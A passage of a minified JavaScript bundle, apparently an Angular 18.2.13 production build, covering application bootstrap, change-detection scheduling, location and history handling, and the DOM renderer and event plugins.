z0(t,e,n,r,i){let o=new jn(t,n,W);return o.multi=[],o.index=e,o.componentProviders=0,_y(o,i,r&&!n),o}function Qr(t,e=[]){return n=>{n.providersResolver=(r,i)=>$0(r,i?i(t):t,e)}}var G0=(()=>{class t{constructor(n){this._injector=n,this.cachedInjectors=new Map}getOrCreateStandaloneInjector(n){if(!n.standalone)return null;if(!this.cachedInjectors.has(n)){let r=Um(!1,n.type),i=r.length>0?yd([r],this._injector,`Standalone[${n.type.name}]`):null;this.cachedInjectors.set(n,i)}return this.cachedInjectors.get(n)}ngOnDestroy(){try{for(let n of this.cachedInjectors.values())n!==null&&n.destroy()}finally{this.cachedInjectors.clear()}}static{this.\u0275prov=E({token:t,providedIn:"environment",factory:()=>new t(N(He))})}}return t})();function Jr(t){io("NgStandalone"),t.getStandaloneInjector=e=>e.get(G0).getOrCreateStandaloneInjector(t)}var Nt=class{constructor(e){this.full=e;let n=e.split(".");this.major=n[0],this.minor=n[1],this.patch=n.slice(2).join(".")}},Iy=new Nt("18.2.13");var Ua=(()=>{class t{log(n){console.log(n)}warn(n){console.warn(n)}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"platform"})}}return t})();var wy=new I("");function zn(t){return!!t&&typeof t.then=="function"}function Ey(t){return!!t&&typeof t.subscribe=="function"}var Cy=new I(""),Dy=(()=>{class t{constructor(){this.initialized=!1,this.done=!1,this.donePromise=new Promise((n,r)=>{this.resolve=n,this.reject=r}),this.appInits=y(Cy,{optional:!0})??[]}runInitializers(){if(this.initialized)return;let n=[];for(let i of this.appInits){let o=i();if(zn(o))n.push(o);else if(Ey(o)){let s=new Promise((a,c)=>{o.subscribe({complete:a,error:c})});n.push(s)}}let r=()=>{this.done=!0,this.resolve()};Promise.all(n).then(()=>{r()}).catch(i=>{this.reject(i)}),n.length===0&&r(),this.initialized=!0}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})(),_d=new I("");function q0(){ug(()=>{throw new w(600,!1)})}function Y0(t){return t.isBoundToModule}var K0=10;function Z0(t,e,n){try{let r=n();return zn(r)?r.catch(i=>{throw e.runOutsideAngular(()=>t.handleError(i)),i}):r}catch(r){throw e.runOutsideAngular(()=>t.handleError(r)),r}}var Gn=(()=>{class t{constructor(){this._bootstrapListeners=[],this._runningTick=!1,this._destroyed=!1,this._destroyListeners=[],this._views=[],this.internalErrorHandler=y(wS),this.afterRenderManager=y(v0),this.zonelessEnabled=y(Fa),this.dirtyFlags=0,this.deferredDirtyFlags=0,this.externalTestViews=new Set,this.beforeRender=new pe,this.afterTick=new pe,this.componentTypes=[],this.components=[],this.isStable=y(Zr).hasPendingTasks.pipe(O(n=>!n)),this._injector=y(He)}get allViews(){return[...this.externalTestViews.keys(),...this._views]}get destroyed(){return this._destroyed}whenStable(){let n;return new Promise(r=>{n=this.isStable.subscribe({next:i=>{i&&r()}})}).finally(()=>{n.unsubscribe()})}get injector(){return this._injector}bootstrap(n,r){let i=n instanceof Ia;if(!this._injector.get(Dy).done){let h=!i&&Fm(n),f=!1;throw new w(405,f)}let s;i?s=n:s=this._injector.get(Gr).resolveComponentFactory(n),this.componentTypes.push(s.componentType);let a=Y0(s)?void 0:this._injector.get(ln),c=r||s.selector,l=s.create(Me.NULL,[],c,a),u=l.location.nativeElement,d=l.injector.get(wy,null);return d?.registerApplication(u),l.onDestroy(()=>{this.detachView(l.hostView),na(this.components,l),d?.unregisterApplication(u)}),this._loadComponent(l),l}tick(){this.zonelessEnabled||(this.dirtyFlags|=1),this._tick()}_tick(){if(this._runningTick)throw new w(101,!1);let n=H(null);try{this._runningTick=!0,this.synchronize()}catch(r){this.internalErrorHandler(r)}finally{this._runningTick=!1,H(n),this.afterTick.next()}}synchronize(){let n=null;this._injector.destroyed||(n=this._injector.get(qr,null,{optional:!0})),this.dirtyFlags|=this.deferredDirtyFlags,this.deferredDirtyFlags=0;let r=0;for(;this.dirtyFlags!==0&&r++<K0;)this.synchronizeOnce(n)}synchronizeOnce(n){if(this.dirtyFlags|=this.deferredDirtyFlags,this.deferredDirtyFlags=0,this.dirtyFlags&7){let r=!!(this.dirtyFlags&1);this.dirtyFlags&=-8,this.dirtyFlags|=8,this.beforeRender.next(r);for(let{_lView:i,notifyErrorHandler:o}of this._views)Q0(i,o,r,this.zonelessEnabled);if(this.dirtyFlags&=-5,this.syncDirtyFlagsWithViews(),this.dirtyFlags&7)return}else n?.begin?.(),n?.end?.();this.dirtyFlags&8&&(this.dirtyFlags&=-9,this.afterRenderManager.execute()),this.syncDirtyFlagsWithViews()}syncDirtyFlagsWithViews(){if(this.allViews.some(({_lView:n})=>Ra(n))){this.dirtyFlags|=2;return}else this.dirtyFlags&=-8}attachView(n){let r=n;this._views.push(r),r.attachToAppRef(this)}detachView(n){let r=n;na(this._views,r),r.detachFromAppRef()}_loadComponent(n){this.attachView(n.hostView),this.tick(),this.components.push(n);let r=this._injector.get(_d,[]);[...this._bootstrapListeners,...r].forEach(i=>i(n))}ngOnDestroy(){if(!this._destroyed)try{this._destroyListeners.forEach(n=>n()),this._views.slice().forEach(n=>n.destroy())}finally{this._destroyed=!0,this._views=[],this._bootstrapListeners=[],this._destroyListeners=[]}}onDestroy(n){return this._destroyListeners.push(n),()=>na(this._destroyListeners,n)}destroy(){if(this._destroyed)throw new w(406,!1);let n=this._injector;n.destroy&&!n.destroyed&&n.destroy()}get viewCount(){return this._views.length}warnIfDestroyed(){}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();function na(t,e){let n=t.indexOf(e);n>-1&&t.splice(n,1)}function Q0(t,e,n,r){if(!n&&!Ra(t))return;dy(t,e,n&&!r?0:1)}var $u=class{constructor(e,n){this.ngModuleFactory=e,this.componentFactories=n}},Id=(()=>{class t{compileModuleSync(n){return new Lu(n)}compileModuleAsync(n){return Promise.resolve(this.compileModuleSync(n))}compileModuleAndAllComponentsSync(n){let r=this.compileModuleSync(n),i=Lm(n),o=Uv(i.declarations).reduce((s,a)=>{let c=Pn(a);return c&&s.push(new Qi(c)),s},[]);return new $u(r,o)}compileModuleAndAllComponentsAsync(n){return Promise.resolve(this.compileModuleAndAllComponentsSync(n))}clearCache(){}clearCacheFor(n){}getModuleId(n){}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();var J0=(()=>{class t{constructor(){this.zone=y(Y),this.changeDetectionScheduler=y(zr),this.applicationRef=y(Gn)}initialize(){this._onMicrotaskEmptySubscription||(this._onMicrotaskEmptySubscription=this.zone.onMicrotaskEmpty.subscribe({next:()=>{this.changeDetectionScheduler.runningTick||this.zone.run(()=>{this.applicationRef.tick()})}}))}ngOnDestroy(){this._onMicrotaskEmptySubscription?.unsubscribe()}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})(),X0=new I("",{factory:()=>!1});function by({ngZoneFactory:t,ignoreChangesOutsideZone:e,scheduleInRootZone:n}){return t??=()=>new Y(x(v({},Ty()),{scheduleInRootZone:n})),[{provide:Y,useFactory:t},{provide:jr,multi:!0,useFactory:()=>{let r=y(J0,{optional:!0});return()=>r.initialize()}},{provide:jr,multi:!0,useFactory:()=>{let r=y(eA);return()=>{r.initialize()}}},e===!0?{provide:gy,useValue:!0}:[],{provide:my,useValue:n??Av}]}function Sy(t){let e=t?.ignoreChangesOutsideZone,n=t?.scheduleInRootZone,r=by({ngZoneFactory:()=>{let i=Ty(t);return i.scheduleInRootZone=n,i.shouldCoalesceEventChangeDetection&&io("NgZone_CoalesceEvent"),new Y(i)},ignoreChangesOutsideZone:e,scheduleInRootZone:n});return gt([{provide:X0,useValue:!0},{provide:Fa,useValue:!1},r])}function Ty(t){return{enableLongStackTrace:!1,shouldCoalesceEventChangeDetection:t?.eventCoalescing??!1,shouldCoalesceRunChangeDetection:t?.runCoalescing??!1}}var eA=(()=>{class t{constructor(){this.subscription=new re,this.initialized=!1,this.zone=y(Y),this.pendingTasks=y(Zr)}initialize(){if(this.initialized)return;this.initialized=!0;let n=null;!this.zone.isStable&&!this.zone.hasPendingMacrotasks&&!this.zone.hasPendingMicrotasks&&(n=this.pendingTasks.add()),this.zone.runOutsideAngular(()=>{this.subscription.add(this.zone.onStable.subscribe(()=>{Y.assertNotInAngularZone(),queueMicrotask(()=>{n!==null&&!this.zone.hasPendingMacrotasks&&!this.zone.hasPendingMicrotasks&&(this.pendingTasks.remove(n),n=null)})}))}),this.subscription.add(this.zone.onUnstable.subscribe(()=>{Y.assertInAngularZone(),n??=this.pendingTasks.add()}))}ngOnDestroy(){this.subscription.unsubscribe()}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();var tA=(()=>{class t{constructor(){this.appRef=y(Gn),this.taskService=y(Zr),this.ngZone=y(Y),this.zonelessEnabled=y(Fa),this.disableScheduling=y(gy,{optional:!0})??!1,this.zoneIsDefined=typeof Zone<"u"&&!!Zone.root.run,this.schedulerTickApplyArgs=[{data:{__scheduler_tick__:!0}}],this.subscriptions=new re,this.angularZoneId=this.zoneIsDefined?this.ngZone._inner?.get(va):null,this.scheduleInRootZone=!this.zonelessEnabled&&this.zoneIsDefined&&(y(my,{optional:!0})??!1),this.cancelScheduledCallback=null,this.useMicrotaskScheduler=!1,this.runningTick=!1,this.pendingRenderTaskId=null,this.subscriptions.add(this.appRef.afterTick.subscribe(()=>{this.runningTick||this.cleanup()})),this.subscriptions.add(this.ngZone.onUnstable.subscribe(()=>{this.runningTick||this.cleanup()})),this.disableScheduling||=!this.zonelessEnabled&&(this.ngZone instanceof Cu||!this.zoneIsDefined)}notify(n){if(!this.zonelessEnabled&&n===5)return;switch(n){case 0:{this.appRef.dirtyFlags|=2;break}case 3:case 2:case 4:case 5:case 1:{this.appRef.dirtyFlags|=4;break}case 7:{this.appRef.deferredDirtyFlags|=8;break}case 9:case 8:case 6:case 10:default:this.appRef.dirtyFlags|=8}if(!this.shouldScheduleTick())return;let r=this.useMicrotaskScheduler?rm:Nv;this.pendingRenderTaskId=this.taskService.add(),this.scheduleInRootZone?this.cancelScheduledCallback=Zone.root.run(()=>r(()=>this.tick())):this.cancelScheduledCallback=this.ngZone.runOutsideAngular(()=>r(()=>this.tick()))}shouldScheduleTick(){return!(this.disableScheduling||this.pendingRenderTaskId!==null||this.runningTick||this.appRef._runningTick||!this.zonelessEnabled&&this.zoneIsDefined&&Zone.current.get(va+this.angularZoneId))}tick(){if(this.runningTick||this.appRef.destroyed)return;!this.zonelessEnabled&&this.appRef.dirtyFlags&7&&(this.appRef.dirtyFlags|=1);let n=this.taskService.add();try{this.ngZone.run(()=>{this.runningTick=!0,this.appRef._tick()},void 0,this.schedulerTickApplyArgs)}catch(r){throw this.taskService.remove(n),r}finally{this.cleanup()}this.useMicrotaskScheduler=!0,rm(()=>{this.useMicrotaskScheduler=!1,this.taskService.remove(n)})}ngOnDestroy(){this.subscriptions.unsubscribe(),this.cleanup()}cleanup(){if(this.runningTick=!1,this.cancelScheduledCallback?.(),this.cancelScheduledCallback=null,this.pendingRenderTaskId!==null){let n=this.pendingRenderTaskId;this.pendingRenderTaskId=null,this.taskService.remove(n)}}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();function nA(){return typeof $localize<"u"&&$localize.locale||Da}var wd=new I("",{providedIn:"root",factory:()=>y(wd,M.Optional|M.SkipSelf)||nA()});var Hu=new I("");function Js(t){return!t.moduleRef}function rA(t){let e=Js(t)?t.r3Injector:t.moduleRef.injector,n=e.get(Y);return n.run(()=>{Js(t)?t.r3Injector.resolveInjectorInitializers():t.moduleRef.resolveInjectorInitializers();let r=e.get(At,null),i;if(n.runOutsideAngular(()=>{i=n.onError.subscribe({next:o=>{r.handleError(o)}})}),Js(t)){let o=()=>e.destroy(),s=t.platformInjector.get(Hu);s.add(o),e.onDestroy(()=>{i.unsubscribe(),s.delete(o)})}else{let o=()=>t.moduleRef.destroy(),s=t.platformInjector.get(Hu);s.add(o),t.moduleRef.onDestroy(()=>{na(t.allPlatformModules,t.moduleRef),i.unsubscribe(),s.delete(o)})}return Z0(r,n,()=>{let o=e.get(Dy);return o.runInitializers(),o.donePromise.then(()=>{let s=e.get(wd,Da);if(L0(s||Da),Js(t)){let a=e.get(Gn);return t.rootComponent!==void 0&&a.bootstrap(t.rootComponent),a}else return iA(t.moduleRef,t.allPlatformModules),t.moduleRef})})})}function iA(t,e){let n=t.injector.get(Gn);if(t._bootstrapComponents.length>0)t._bootstrapComponents.forEach(r=>n.bootstrap(r));else if(t.instance.ngDoBootstrap)t.instance.ngDoBootstrap(n);else throw new w(-403,!1);e.push(t)}var ra=null;function oA(t=[],e){return Me.create({name:e,providers:[{provide:Ta,useValue:"platform"},{provide:Hu,useValue:new Set([()=>ra=null])},...t]})}function sA(t=[]){if(ra)return ra;let e=oA(t);return ra=e,q0(),aA(e),e}function aA(t){t.get(od,null)?.forEach(n=>n())}var Xr=(()=>{class t{static{this.__NG_ELEMENT_ID__=cA}}return t})();function cA(t){return lA(We(),me(),(t&16)===16)}function lA(t,e,n){if(Na(t)&&!n){let r=dn(t.index,e);return new Wr(r,r)}else if(t.type&175){let r=e[ft];return new Wr(r,e)}return null}function Ay(t){try{let{rootComponent:e,appProviders:n,platformProviders:r}=t,i=sA(r),o=[by({}),{provide:zr,useExisting:tA},...n||[]],s=new Ea({providers:o,parent:i,debugName:"",runEnvironmentInitializers:!1});return rA({r3Injector:s.injector,platformInjector:i,rootComponent:e})}catch(e){return Promise.reject(e)}}function so(t,e){io("NgSignals");let n=ag(t);return e?.equal&&(n[Qt].equal=e.equal),n}function Lt(t){let e=H(null);try{return t()}finally{H(e)}}var xy=null;function Vt(){return xy}function Oy(t){xy??=t}var Ba=class{};var ze=new I(""),Py=(()=>{class t{historyGo(n){throw new Error("")}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:()=>y(hA),providedIn:"platform"})}}return t})();var hA=(()=>{class t extends Py{constructor(){super(),this._doc=y(ze),this._location=window.location,this._history=window.history}getBaseHrefFromDOM(){return Vt().getBaseHref(this._doc)}onPopState(n){let r=Vt().getGlobalEventTarget(this._doc,"window");return r.addEventListener("popstate",n,!1),()=>r.removeEventListener("popstate",n)}onHashChange(n){let r=Vt().getGlobalEventTarget(this._doc,"window");return r.addEventListener("hashchange",n,!1),()=>r.removeEventListener("hashchange",n)}get href(){return this._location.href}get protocol(){return this._location.protocol}get hostname(){return this._location.hostname}get port(){return this._location.port}get pathname(){return this._location.pathname}get search(){return this._location.search}get hash(){return this._location.hash}set pathname(n){this._location.pathname=n}pushState(n,r,i){this._history.pushState(n,r,i)}replaceState(n,r,i){this._history.replaceState(n,r,i)}forward(){this._history.forward()}back(){this._history.back()}historyGo(n=0){this._history.go(n)}getState(){return this._history.state}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:()=>new t,providedIn:"platform"})}}return t})();function ky(t,e){if(t.length==0)return e;if(e.length==0)return t;let n=0;return t.endsWith("/")&&n++,e.startsWith("/")&&n++,n==2?t+e.substring(1):n==1?t+e:t+"/"+e}function My(t){let e=t.match(/#|\?|$/),n=e&&e.index||t.length,r=n-(t[n-1]==="/"?1:0);return t.slice(0,r)+t.slice(n)}function qn(t){return t&&t[0]!=="?"?"?"+t:t}var Ha=(()=>{class t{historyGo(n){throw new Error("")}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:()=>y(Fy),providedIn:"root"})}}return t})(),fA=new I(""),Fy=(()=>{class t extends Ha{constructor(n,r){super(),this._platformLocation=n,this._removeListenerFns=[],this._baseHref=r??this._platformLocation.getBaseHrefFromDOM()??y(ze).location?.origin??""}ngOnDestroy(){for(;this._removeListenerFns.length;)this._removeListenerFns.pop()()}onPopState(n){this._removeListenerFns.push(this._platformLocation.onPopState(n),this._platformLocation.onHashChange(n))}getBaseHref(){return this._baseHref}prepareExternalUrl(n){return ky(this._baseHref,n)}path(n=!1){let r=this._platformLocation.pathname+qn(this._platformLocation.search),i=this._platformLocation.hash;return i&&n?`${r}${i}`:r}pushState(n,r,i,o){let s=this.prepareExternalUrl(i+qn(o));this._platformLocation.pushState(n,r,s)}replaceState(n,r,i,o){let s=this.prepareExternalUrl(i+qn(o));this._platformLocation.replaceState(n,r,s)}forward(){this._platformLocation.forward()}back(){this._platformLocation.back()}getState(){return this._platformLocation.getState()}historyGo(n=0){this._platformLocation.historyGo?.(n)}static{this.\u0275fac=function(r){return new(r||t)(N(Py),N(fA,8))}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac,providedIn:"root"})}}return t})();var ao=(()=>{class t{constructor(n){this._subject=new se,this._urlChangeListeners=[],this._urlChangeSubscription=null,this._locationStrategy=n;let r=this._locationStrategy.getBaseHref();this._basePath=mA(My(Ny(r))),this._locationStrategy.onPopState(i=>{this._subject.emit({url:this.path(!0),pop:!0,state:i.state,type:i.type})})}ngOnDestroy(){this._urlChangeSubscription?.unsubscribe(),this._urlChangeListeners=[]}path(n=!1){return this.normalize(this._locationStrategy.path(n))}getState(){return this._locationStrategy.getState()}isCurrentPathEqualTo(n,r=""){return this.path()==this.normalize(n+qn(r))}normalize(n){return t.stripTrailingSlash(gA(this._basePath,Ny(n)))}prepareExternalUrl(n){return n&&n[0]!=="/"&&(n="/"+n),this._locationStrategy.prepareExternalUrl(n)}go(n,r="",i=null){this._locationStrategy.pushState(i,"",n,r),this._notifyUrlChangeListeners(this.prepareExternalUrl(n+qn(r)),i)}replaceState(n,r="",i=null){this._locationStrategy.replaceState(i,"",n,r),this._notifyUrlChangeListeners(this.prepareExternalUrl(n+qn(r)),i)}forward(){this._locationStrategy.forward()}back(){this._locationStrategy.back()}historyGo(n=0){this._locationStrategy.historyGo?.(n)}onUrlChange(n){return this._urlChangeListeners.push(n),this._urlChangeSubscription??=this.subscribe(r=>{this._notifyUrlChangeListeners(r.url,r.state)}),()=>{let r=this._urlChangeListeners.indexOf(n);this._urlChangeListeners.splice(r,1),this._urlChangeListeners.length===0&&(this._urlChangeSubscription?.unsubscribe(),this._urlChangeSubscription=null)}}_notifyUrlChangeListeners(n="",r){this._urlChangeListeners.forEach(i=>i(n,r))}subscribe(n,r,i){return this._subject.subscribe({next:n,error:r,complete:i})}static{this.normalizeQueryParams=qn}static{this.joinWithSlash=ky}static{this.stripTrailingSlash=My}static{this.\u0275fac=function(r){return new(r||t)(N(Ha))}}static{this.\u0275prov=E({token:t,factory:()=>pA(),providedIn:"root"})}}return t})();function pA(){return new ao(N(Ha))}function gA(t,e){if(!t||!e.startsWith(t))return e;let n=e.substring(t.length);return n===""||["/",";","?","#"].includes(n[0])?n:e}function Ny(t){return t.replace(/\/index.html$/,"")}function mA(t){if(new RegExp("^(https?:)?//").test(t)){let[,n]=t.split(/\/\/[^\/]+/);return n}return t}function Ly(t,e){e=encodeURIComponent(e);for(let n of t.split(";")){let r=n.indexOf("="),[i,o]=r==-1?[n,""]:[n.slice(0,r),n.slice(r+1)];if(i.trim()===e)return decodeURIComponent(o)}return null}var Ed=(()=>{class t{static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275mod=$n({type:t})}static{this.\u0275inj=Bn({})}}return t})(),Vy="browser",vA="server";function Cd(t){return t===vA}var $a=class{};var Sd=class extends Ba{constructor(){super(...arguments),this.supportsDOMEvents=!0}},Td=class t extends Sd{static makeCurrent(){Oy(new t)}onAndCancel(e,n,r){return e.addEventListener(n,r),()=>{e.removeEventListener(n,r)}}dispatchEvent(e,n){e.dispatchEvent(n)}remove(e){e.remove()}createElement(e,n){return n=n||this.getDefaultDocument(),n.createElement(e)}createHtmlDocument(){return document.implementation.createHTMLDocument("fakeTitle")}getDefaultDocument(){return document}isElementNode(e){return e.nodeType===Node.ELEMENT_NODE}isShadowRoot(e){return e instanceof DocumentFragment}getGlobalEventTarget(e,n){return n==="window"?window:n==="document"?e:n==="body"?e.body:null}getBaseHref(e){let n=yA();return n==null?null:_A(n)}resetBaseElement(){co=null}getUserAgent(){return window.navigator.userAgent}getCookie(e){return Ly(document.cookie,e)}},co=null;function yA(){return co=co||document.querySelector("base"),co?co.getAttribute("href"):null}function _A(t){return new URL(t,document.baseURI).pathname}var IA=(()=>{class t{build(){return new XMLHttpRequest}static{this.\u0275fac=function(r){return new(r||t)}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac})}}return t})(),Ad=new I(""),$y=(()=>{class t{constructor(n,r){this._zone=r,this._eventNameToPlugin=new Map,n.forEach(i=>{i.manager=this}),this._plugins=n.slice().reverse()}addEventListener(n,r,i){return this._findPluginFor(r).addEventListener(n,r,i)}getZone(){return this._zone}_findPluginFor(n){let r=this._eventNameToPlugin.get(n);if(r)return r;if(r=this._plugins.find(o=>o.supports(n)),!r)throw new w(5101,!1);return this._eventNameToPlugin.set(n,r),r}static{this.\u0275fac=function(r){return new(r||t)(N(Ad),N(Y))}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac})}}return t})(),Wa=class{constructor(e){this._doc=e}},Dd="ng-app-id",Hy=(()=>{class t{constructor(n,r,i,o={}){this.doc=n,this.appId=r,this.nonce=i,this.platformId=o,this.styleRef=new Map,this.hostNodes=new Set,this.styleNodesInDOM=this.collectServerRenderedStyles(),this.platformIsServer=Cd(o),this.resetHostNodes()}addStyles(n){for(let r of n)this.changeUsageCount(r,1)===1&&this.onStyleAdded(r)}removeStyles(n){for(let r of n)this.changeUsageCount(r,-1)<=0&&this.onStyleRemoved(r)}ngOnDestroy(){let n=this.styleNodesInDOM;n&&(n.forEach(r=>r.remove()),n.clear());for(let r of this.getAllStyles())this.onStyleRemoved(r);this.resetHostNodes()}addHost(n){this.hostNodes.add(n);for(let r of this.getAllStyles())this.addStyleToHost(n,r)}removeHost(n){this.hostNodes.delete(n)}getAllStyles(){return this.styleRef.keys()}onStyleAdded(n){for(let r of this.hostNodes)this.addStyleToHost(r,n)}onStyleRemoved(n){let r=this.styleRef;r.get(n)?.elements?.forEach(i=>i.remove()),r.delete(n)}collectServerRenderedStyles(){let n=this.doc.head?.querySelectorAll(`style[${Dd}="${this.appId}"]`);if(n?.length){let r=new Map;return n.forEach(i=>{i.textContent!=null&&r.set(i.textContent,i)}),r}return null}changeUsageCount(n,r){let i=this.styleRef;if(i.has(n)){let o=i.get(n);return o.usage+=r,o.usage}return i.set(n,{usage:r,elements:[]}),r}getStyleElement(n,r){let i=this.styleNodesInDOM,o=i?.get(r);if(o?.parentNode===n)return i.delete(r),o.removeAttribute(Dd),o;{let s=this.doc.createElement("style");return this.nonce&&s.setAttribute("nonce",this.nonce),s.textContent=r,this.platformIsServer&&s.setAttribute(Dd,this.appId),n.appendChild(s),s}}addStyleToHost(n,r){let i=this.getStyleElement(n,r),o=this.styleRef,s=o.get(r)?.elements;s?s.push(i):o.set(r,{elements:[i],usage:1})}resetHostNodes(){let n=this.hostNodes;n.clear(),n.add(this.doc.head)}static{this.\u0275fac=function(r){return new(r||t)(N(ze),N(id),N(sd,8),N(hn))}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac})}}return t})(),bd={svg:"http://www.w3.org/2000/svg",xhtml:"http://www.w3.org/1999/xhtml",xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/",math:"http://www.w3.org/1998/Math/MathML"},Nd=/%COMP%/g,Wy="%COMP%",wA=`_nghost-${Wy}`,EA=`_ngcontent-${Wy}`,CA=!0,DA=new I("",{providedIn:"root",factory:()=>CA});function bA(t){return EA.replace(Nd,t)}function SA(t){return wA.replace(Nd,t)}function zy(t,e){return e.map(n=>n.replace(Nd,t))}var jy=(()=>{class t{constructor(n,r,i,o,s,a,c,l=null){this.eventManager=n,this.sharedStylesHost=r,this.appId=i,this.removeStylesOnCompDestroy=o,this.doc=s,this.platformId=a,this.ngZone=c,this.nonce=l,this.rendererByCompId=new Map,this.platformIsServer=Cd(a),this.defaultRenderer=new lo(n,s,c,this.platformIsServer)}createRenderer(n,r){if(!n||!r)return this.defaultRenderer;this.platformIsServer&&r.encapsulation===ht.ShadowDom&&(r=x(v({},r),{encapsulation:ht.Emulated}));let i=this.getOrCreateRenderer(n,r);return i instanceof za?i.applyToHost(n):i instanceof uo&&i.applyStyles(),i}getOrCreateRenderer(n,r){let i=this.rendererByCompId,o=i.get(r.id);if(!o){let s=this.doc,a=this.ngZone,c=this.eventManager,l=this.sharedStylesHost,u=this.removeStylesOnCompDestroy,d=this.platformIsServer;switch(r.encapsulation){case ht.Emulated:o=new za(c,l,r,this.appId,u,s,a,d);break;case ht.ShadowDom:return new Md(c,l,n,r,s,a,this.nonce,d);default:o=new uo(c,l,r,u,s,a,d);break}i.set(r.id,o)}return o}ngOnDestroy(){this.rendererByCompId.clear()}static{this.\u0275fac=function(r){return new(r||t)(N($y),N(Hy),N(id),N(DA),N(ze),N(hn),N(Y),N(sd))}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac})}}return t})(),lo=class{constructor(e,n,r,i){this.eventManager=e,this.doc=n,this.ngZone=r,this.platformIsServer=i,this.data=Object.create(null),this.throwOnSyntheticProps=!0,this.destroyNode=null}destroy(){}createElement(e,n){return n?this.doc.createElementNS(bd[n]||n,e):this.doc.createElement(e)}createComment(e){return this.doc.createComment(e)}createText(e){return this.doc.createTextNode(e)}appendChild(e,n){(Uy(e)?e.content:e).appendChild(n)}insertBefore(e,n,r){e&&(Uy(e)?e.content:e).insertBefore(n,r)}removeChild(e,n){n.remove()}selectRootElement(e,n){let r=typeof e=="string"?this.doc.querySelector(e):e;if(!r)throw new w(-5104,!1);return n||(r.textContent=""),r}parentNode(e){return e.parentNode}nextSibling(e){return e.nextSibling}setAttribute(e,n,r,i){if(i){n=i+":"+n;let o=bd[i];o?e.setAttributeNS(o,n,r):e.setAttribute(n,r)}else e.setAttribute(n,r)}removeAttribute(e,n,r){if(r){let i=bd[r];i?e.removeAttributeNS(i,n):e.removeAttribute(`${r}:${n}`)}else e.removeAttribute(n)}addClass(e,n){e.classList.add(n)}removeClass(e,n){e.classList.remove(n)}setStyle(e,n,r,i){i&(Mt.DashCase|Mt.Important)?e.style.setProperty(n,r,i&Mt.Important?"important":""):e.style[n]=r}removeStyle(e,n,r){r&Mt.DashCase?e.style.removeProperty(n):e.style[n]=""}setProperty(e,n,r){e!=null&&(e[n]=r)}setValue(e,n){e.nodeValue=n}listen(e,n,r){if(typeof e=="string"&&(e=Vt().getGlobalEventTarget(this.doc,e),!e))throw new Error(`Unsupported event target ${e} for event ${n}`);return this.eventManager.addEventListener(e,n,this.decoratePreventDefault(r))}decoratePreventDefault(e){return n=>{if(n==="__ngUnwrap__")return e;(this.platformIsServer?this.ngZone.runGuarded(()=>e(n)):e(n))===!1&&n.preventDefault()}}};function Uy(t){return t.tagName==="TEMPLATE"&&t.content!==void 0}var Md=class extends lo{constructor(e,n,r,i,o,s,a,c){super(e,o,s,c),this.sharedStylesHost=n,this.hostEl=r,this.shadowRoot=r.attachShadow({mode:"open"}),this.sharedStylesHost.addHost(this.shadowRoot);let l=zy(i.id,i.styles);for(let u of l){let d=document.createElement("style");a&&d.setAttribute("nonce",a),d.textContent=u,this.shadowRoot.appendChild(d)}}nodeOrShadowRoot(e){return e===this.hostEl?this.shadowRoot:e}appendChild(e,n){return super.appendChild(this.nodeOrShadowRoot(e),n)}insertBefore(e,n,r){return super.insertBefore(this.nodeOrShadowRoot(e),n,r)}removeChild(e,n){return super.removeChild(null,n)}parentNode(e){return this.nodeOrShadowRoot(super.parentNode(this.nodeOrShadowRoot(e)))}destroy(){this.sharedStylesHost.removeHost(this.shadowRoot)}},uo=class extends lo{constructor(e,n,r,i,o,s,a,c){super(e,o,s,a),this.sharedStylesHost=n,this.removeStylesOnCompDestroy=i,this.styles=c?zy(c,r.styles):r.styles}applyStyles(){this.sharedStylesHost.addStyles(this.styles)}destroy(){this.removeStylesOnCompDestroy&&this.sharedStylesHost.removeStyles(this.styles)}},za=class extends uo{constructor(e,n,r,i,o,s,a,c){let l=i+"-"+r.id;super(e,n,r,o,s,a,c,l),this.contentAttr=bA(l),this.hostAttr=SA(l)}applyToHost(e){this.applyStyles(),this.setAttribute(e,this.hostAttr,"")}createElement(e,n){let r=super.createElement(e,n);return super.setAttribute(r,this.contentAttr,""),r}},TA=(()=>{class t extends Wa{constructor(n){super(n)}supports(n){return!0}addEventListener(n,r,i){return n.addEventListener(r,i,!1),()=>this.removeEventListener(n,r,i)}removeEventListener(n,r,i){return n.removeEventListener(r,i)}static{this.\u0275fac=function(r){return new(r||t)(N(ze))}}static{this.\u0275prov=E({token:t,factory:t.\u0275fac})}}return t})(),By=["alt","control","meta","shift"],AA={"\b":"Backspace","	":"Tab","\x7F":"Delete","\x1B":"Escape",Del:"Delete",Esc:"Escape",Left:"ArrowLeft",Right:"ArrowRight",Up:"ArrowUp",Down:"ArrowDown",Menu:"ContextMenu",Scroll:"ScrollLock",Win:"OS"},MA={alt:t=>t.altKey,control:t=>t.ctrlKey,meta:t=>t.metaKey,shift:t=>t.shiftKey},NA=(()=>{class t extends Wa{constructor(n){super(n)}supports(n){return t.parseEventName(n)!=null}addEventListener(n,r,i){let o=t.parseEventName(r),s=t.eventCallback(o.fullKey,i,this.manager.getZone());return 